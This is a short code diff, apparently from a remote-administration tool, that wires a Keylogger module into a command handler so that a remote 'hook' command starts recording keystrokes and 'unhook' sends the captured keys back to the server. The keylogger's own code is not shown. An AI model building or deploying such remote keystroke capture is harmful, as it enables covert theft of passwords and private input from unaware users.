@@ -1,3 +1,4 @@
+import Keylogger
 import ProcessRunning
 
 import io
@@ -43,11 +44,16 @@ def action_app(option, data):
         error_code = 0 if r == 0 else 200 if r == 1 else 201 if r == 2 else 202
     return (error_code, server_data)
 
+# Global variable
+keylogger = Keylogger.Keylogger()
 def action_keylogging(option, data):
     error_code = 0
     server_data = ''
 
-    """Code here"""
+    if option == 'hook':
+        keylogger.hook()
+    elif option == 'unhook':
+        server_data = keylogger.unhook()
 
     return (error_code, server_data)
 
